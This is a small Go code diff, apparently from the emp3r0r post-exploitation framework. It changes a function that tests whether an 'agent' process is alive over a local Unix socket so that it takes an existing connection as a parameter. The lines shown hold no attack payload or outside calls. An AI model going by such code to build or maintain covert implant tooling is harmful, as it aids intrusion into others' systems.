@@ -20,13 +20,8 @@ import (
 
 // is the agent alive?
 // connect to emp3r0r_data.SocketName, send a message, see if we get a reply
-func IsAgentAlive() bool {
+func IsAgentAlive(c net.Conn) bool {
 	log.Println("Testing if agent is alive...")
-	c, err := net.Dial("unix", RuntimeConfig.SocketName)
-	if err != nil {
-		log.Printf("Seems dead: %v", err)
-		return false
-	}
 	defer c.Close()
 
 	replyFromAgent := make(chan string, 1)
